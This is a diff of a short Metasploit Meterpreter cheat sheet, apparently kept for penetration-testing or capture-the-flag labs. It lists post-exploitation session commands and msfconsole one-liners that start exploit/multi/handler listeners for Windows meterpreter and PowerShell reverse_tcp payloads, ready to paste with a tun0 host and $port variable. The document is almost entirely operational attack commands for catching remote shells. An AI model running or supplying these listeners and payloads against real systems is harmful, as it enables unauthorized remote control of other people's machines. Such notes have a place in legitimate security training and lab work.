@@ -1,8 +1,10 @@
 # meterpreter
 
 - [Offensive PowerShell with Metasploit Meterpreter](#offensive-powershell-with-metasploit-meterpreter)
+- [TL;DR](#tldr)
+- [One Liner Start Meterpreter](#one-liner-start-meterpreter)
 
-### TL;DR
+# [TL;DR](#tldr-1)
 ```sh
 sysinfo
 getuid
@@ -14,19 +16,22 @@ ps <string-to-search>
 ps -S <string-to-search>
 sessions
 ```
+
 ## 
 ```sh
-
+echo > ~/myip.txt <IP>
+zsh
+echo $myip
 ```
 
-### One liner start meterpreter
+# [One Liner Start Meterpreter](#one-liner-start-meterpreter-1)
 https://github.com/andrewjkerr/security-cheatsheets/blob/master/metasploit
 ```sh
-msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <listening_host>;set LPORT <listening_port>;run;"
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;set LPORT $port;run;"
 
-msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST tun0; set LPORT 443;run;"
+msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST tun0; set LPORT $port;run;"
 
-msfconsole -x "use exploit/multi/handler;set payload windows/x64/powershell_reverse_tcp;set LHOST tun0; set LPORT 444;run;"
+msfconsole -x "use exploit/multi/handler;set payload windows/x64/powershell_reverse_tcp;set LHOST tun0; set LPORT $port;run;"
 ```
 
 ## 
